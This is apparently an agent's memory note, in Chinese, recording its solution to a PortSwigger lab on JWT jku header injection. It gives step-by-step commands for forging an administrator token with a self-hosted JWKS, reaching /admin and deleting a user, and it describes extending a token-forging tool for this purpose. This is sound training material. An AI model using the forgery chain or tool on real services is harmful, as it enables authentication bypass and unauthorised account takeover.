---
metadata:
  node_type: memory
name: "portswigger-jwt-labs"
description: "jku 头注入 lab 解法:jwk_inject 增 --jku/--jwks-out 频段,托管 JWKS 到 exploit server 后伪造 administrator 会话删 carlos"
last_updated: 2026-10-10T12:33:08+08:00
created: 2026-10-10T12:33:08+08:00
---

## lab-jwt-authentication-bypass-via-jku-header-injection (arm A 实录)

题面:服务端支持 JWT 头的 jku 参数但不校验域名,伪造可访问 /admin 的 token 并删除 carlos。

链路(全部走件):
1. `page_read` 取 widget-lab-id;`range_launch launch-url /web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection --jar /tmp/cj1.json` 起实例(reused:false)。实例 banner 里的 exploit-link 给出 exploit server 主机(https://exploit-<id>.exploit-server.net)。
2. `http_session get /login` 取 csrf,`http_session post /login`(csrf/username=wiener/password=peter)拿到 session JWT:
   header `{"kid":"0bc9ab9f-a7fb-48a0-b174-4bc9c10276e8","alg":"RS256"}`,payload `{"iss":"portswigger","exp":...,"sub":"wiener"}` —— 即 kid 是服务器已知密钥 id,伪造时头里必须回填同一 kid。
3. 件化缺口:原 `jwk_inject` 只做"jwk 字段内嵌公钥",jku 族需要"头里放 jku URL + 自己托管 JWKS"。已把该能力并入同一件(v1.1.0,同一套 RSA 签名代码,不新开重复件):
   - `--jku URL` 时头写 `{"kid","alg":"RS256","jku":URL}`,不再带 jwk;
   - 信封多出 `mode`/`jku`/`jwks`/`jwks_out`,并可用 `--jwks-out FILE` 落盘公钥集 `{"keys":[{kty,e,n,kid,alg,use}]}`;
   - selftest 增 `jku_header_carries_jku`、`jwks_shape` 两断言(全 true)。
4. 伪造:`jwk_inject --host <lab> --jku https://exploit-<id>.exploit-server.net/jwks.json --kid <原 kid> --sub administrator --jar /tmp/cj1.json --jwks-out /tmp/jwks.json --key-out /tmp/jku_key.pem`(jar 里 session 被替换成伪造 token)。
5. 托管:`http_session post https://exploit-<id>.exploit-server.net/ --form responseFile=/jwks.json --form 'responseHead=HTTP/1.1 200 OK\nContent-Type: application/json' --form 'responseBody=<jwks JSON>' --form formAction=STORE`;再 `http_session get <exploit>/jwks.json` 复验 200 + application/json + kid 命中。
6. 利用:`http_session get <lab>/admin --jar /tmp/cj1.json` → 200 管理员面板(含 carlos 删除链接);`get /admin/delete?username=carlos` → 302 /admin。
7. 判定:`banner_verdict <lab>/ --jar /tmp/cj1.json` → solved:true,`<h4>Congratulations, you solved the lab!</h4>`。

要点/复用:
- exploit server 的 STORE 是表单 POST,responseFile 命名路径,同一次 STORE 只落一个文件;口令链路里的 CSRF 必须从 GET /login 的 csrf 隐藏字段取。
- jku 与 jwk 是同一"头里的密钥来源"族:前者要外托管公钥集,后者内嵌;两者都要求头 kid 与密钥集里的 kid 一致。
- 本族不需要读题解:题面描述(不校验 jku 域名)已给足方法。

